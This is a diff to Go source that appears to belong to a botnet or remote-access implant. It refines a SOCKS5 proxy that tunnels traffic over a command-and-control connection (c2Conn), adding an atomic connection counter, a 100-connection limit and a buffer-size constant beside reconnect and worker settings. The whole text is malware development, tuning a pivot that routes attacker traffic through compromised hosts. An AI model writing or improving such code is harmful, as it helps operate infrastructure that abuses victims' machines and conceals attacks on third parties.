@@ -52,11 +52,17 @@ const (
 )
 
 var (
-	reconnectDelay = 5 * time.Second
-	numWorkers     = 2024
-	socksListener  net.Listener
-	socksRunning   bool
-	socksMutex     sync.Mutex
+	reconnectDelay      = 5 * time.Second
+	numWorkers          = 2024
+	socksListener       net.Listener
+	socksRunning        bool
+	socksMutex          sync.Mutex
+	socksConnCount      int32
+	maxSocksConnections int32 = 100
+)
+
+const (
+	socksBufferSize = 256
 )
 
 // Helper functions
@@ -441,6 +447,7 @@ func startSocksProxy(port string, c2Conn net.Conn) error {
 
 	socksListener = listener
 	socksRunning = true
+	atomic.StoreInt32(&socksConnCount, 0)
 
 	go func() {
 		for {
@@ -451,7 +458,16 @@ func startSocksProxy(port string, c2Conn net.Conn) error {
 				}
 				return
 			}
-			go handleSocksConnection(conn, c2Conn)
+			// Check connection limit
+			if atomic.LoadInt32(&socksConnCount) >= maxSocksConnections {
+				conn.Close()
+				continue
+			}
+			atomic.AddInt32(&socksConnCount, 1)
+			go func(c net.Conn) {
+				defer atomic.AddInt32(&socksConnCount, -1)
+				handleSocksConnection(c, c2Conn)
+			}(conn)
 		}
 	}()
 
@@ -473,7 +489,7 @@ func handleSocksConnection(clientConn net.Conn, c2Conn net.Conn) {
 	defer clientConn.Close()
 
 	// SOCKS5 handshake
-	buf := make([]byte, 256)
+	buf := make([]byte, socksBufferSize)
 
 	// Read version and auth methods
 	n, err := clientConn.Read(buf)
